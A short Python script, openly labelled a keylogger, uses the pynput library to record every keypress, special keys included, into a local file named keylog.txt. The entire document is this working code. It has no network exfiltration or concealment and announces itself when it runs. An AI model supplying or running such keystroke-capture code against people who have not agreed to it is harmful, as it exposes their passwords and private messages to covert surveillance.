from pynput import keyboard

# Log file to save keystrokes
log_file = "keylog.txt"

# Function to handle key press
def keypressed(key):
    try:
        with open(log_file, "a") as log:
            log.write(key.char)
    except AttributeError:
        # Handles special keys like space, enter, etc.
        with open(log_file, "a") as log:
            log.write(f"[{key}]")

# Start the key listener
if __name__ == "__main__":
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()  # Keeps the program running
